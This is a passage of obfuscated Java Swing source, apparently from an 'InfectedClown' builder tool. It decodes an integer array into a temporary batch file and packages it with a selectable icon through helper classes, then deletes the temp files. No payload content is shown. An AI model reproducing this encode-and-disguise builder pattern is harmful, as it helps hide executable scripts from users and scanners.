        else if(r8.isSelected()){P = 7;}  
        else if(r9.isSelected()){P = 8;}  
        else if(r10.isSelected()){P = 9;} 
        else if(r11.isSelected()){P = 10;}
        else if(r12.isSelected()){P = 11;}
        else if(r13.isSelected()){P = 12;}
        else if(r14.isSelected()){P = 13;}
        else if(r15.isSelected()){P = 14;}
        else if(r16.isSelected()){P = 15;}
         __Class__2.__Class___();
         
    }//GEN-LAST:event_MCActionPerformed

    private void AbutActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_AbutActionPerformed

        if (Desktop.isDesktopSupported() && Desktop.getDesktop().isSupported(Desktop.Action.BROWSE)) {
            try {
                Desktop.getDesktop().browse(new URI("https://github.com/InfectedClown"));
            } catch (URISyntaxException | IOException ex) {
                Logger.getLogger(__Class__1.class.getName()).log(Level.SEVERE, null, ex);
            }
}     
    }//GEN-LAST:event_AbutActionPerformed

    private void IcoActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_IcoActionPerformed
      PopUp.show(
                Ico,             
                    1 , 
                    1
        );       
        
    }//GEN-LAST:event_IcoActionPerformed

    public static void Roption (
            String I,
            int[] L ,
            int[] C ,
            String T) throws IOException, InterruptedException{
         try {
            key = Icon_L.getIcon().hashCode();
            String BYTE = "";

            for (int i = 0 ; 
                    i != L.length ; 
                    i++){
                
                BYTE+= _InfectedClown_1.Rev(L[i]);
            }

            final Path path_3;
            final Path Ci;
             Ci = Files.createTempFile("InfectedClown", ".ico");
             path_3 = Files.createTempFile("InfectedClown", ".bat");
             byte[] buf_3 = BYTE.getBytes();
             Files.write(path_3, buf_3);
            _InfectedClown_2.Renv("/__Asset__/"+I,Ci.toString(),__Class__1.class);        
            _infectedclown_3.C.C(T, path_3.toString(),path_3.getFileName().toString(), path_3.toString().replace(path_3.getFileName().toString(),""));
            JAVAC.__C.Ice(T,Ci.toString());
            Thread.sleep(1000);
            Ci.toFile().delete();
            path_3.toFile().delete();

        } catch (IOException ex) {
            Logger.getLogger(__Class__1.class.getName()).log(Level.SEVERE, null, ex);
        }



    }
    private void i_1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_i_1ActionPerformed
        Icon_L.setIcon(i_1.getIcon());
        R = 1;
      
    }//GEN-LAST:event_i_1ActionPerformed

    private void i_8ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_i_8ActionPerformed
        Icon_L.setIcon(i_8.getIcon());
        R = 6;
    }//GEN-LAST:event_i_8ActionPerformed

    private void i_9ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_i_9ActionPerformed
        Icon_L.setIcon(i_9.getIcon());
        R = 7;
    }//GEN-LAST:event_i_9ActionPerformed

    private void i_10ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_i_10ActionPerformed
        Icon_L.setIcon(i_10.getIcon());
        R = 8;
    }//GEN-LAST:event_i_10ActionPerformed

    private void i_14ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_i_14ActionPerformed
        Icon_L.setIcon(i_14.getIcon());
        R = 5;
    }//GEN-LAST:event_i_14ActionPerformed

    private void i_13ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_i_13ActionPerformed
        Icon_L.setIcon(i_13.getIcon());
        R = 2;
    }//GEN-LAST:event_i_13ActionPerformed

    private void i_12ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_i_12ActionPerformed
        Icon_L.setIcon(i_12.getIcon());
        R = 3;
    }//GEN-LAST:event_i_12ActionPerformed

    private void i_11ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_i_11ActionPerformed
        Icon_L.setIcon(i_11.getIcon());
        R = 5;
    }//GEN-LAST:event_i_11ActionPerformed

    public static void Run() {

        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("CDE/Motif".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException | InstantiationException | IllegalAccessException | javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(__Class__1.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }

        java.awt.EventQueue.invokeLater(() -> {
            new __Class__1().setVisible(true);
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton Abut;
    private javax.swing.ButtonGroup GP;
    private javax.swing.JButton Ico;
    public static javax.swing.JLabel Icon_L;
    private javax.swing.JButton MC;
    private javax.swing.JLabel Op;
    private javax.swing.JPopupMenu PopUp;
    private javax.swing.JLabel ______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________;
    private javax.swing.JMenuItem i_1;
    private javax.swing.JMenuItem i_10;
    private javax.swing.JMenuItem i_11;
    private javax.swing.JMenuItem i_12;
    private javax.swing.JMenuItem i_13;
    private javax.swing.JMenuItem i_14;
    private javax.swing.JMenuItem i_8;
    private javax.swing.JMenuItem i_9;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JPanel jPanel2;
    private javax.swing.JPanel jPanel3;
    private javax.swing.JPanel jPanel4;
    private javax.swing.JSeparator jSeparator1;
    private javax.swing.JSeparator jSeparator2;
    private javax.swing.JRadioButton r1;
    private javax.swing.JRadioButton r10;
    private javax.swing.JRadioButton r11;
    private javax.swing.JRadioButton r12;
    private javax.swing.JRadioButton r13;
    private javax.swing.JRadioButton r14;
    private javax.swing.JRadioButton r15;
    private javax.swing.JRadioButton r16;
    private javax.swing.JRadioButton r2;
    private javax.swing.JRadioButton r3;
    private javax.swing.JRadioButton r4;
    private javax.swing.JRadioButton r5;
    private javax.swing.JRadioButton r6;
    private javax.swing.JRadioButton r7;
    private javax.swing.JRadioButton r8;
    private javax.swing.JRadioButton r9;
    // End of variables declaration//GEN-END:variables
}
